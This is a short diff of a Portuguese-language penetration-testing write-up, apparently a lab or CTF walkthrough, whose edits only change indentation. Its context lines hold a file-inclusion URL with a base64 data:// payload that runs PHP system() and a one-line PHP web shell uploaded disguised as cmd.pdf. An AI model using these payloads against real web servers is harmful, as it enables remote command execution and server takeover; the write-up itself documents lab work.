@@ -52,8 +52,7 @@ http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCR
 
 📌 Resposta :  
 ```
-    -rwxrwxrwx  1 www-data www-data    37 Sep 19 08:57 .htaccess
-
+-rwxrwxrwx  1 www-data www-data    37 Sep 19 08:57 .htaccess
 ```
 
 ---
@@ -62,8 +61,7 @@ http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCR
 
 Comando utilizado para envio do **cmd.pdf**:  
 ```
-
-    ** conteudo do cmd: <?php system($_GET['cmd']); ?> **
+** conteudo do cmd: <?php system($_GET['cmd']); ?> **
 
 envio desse conteudo:
 
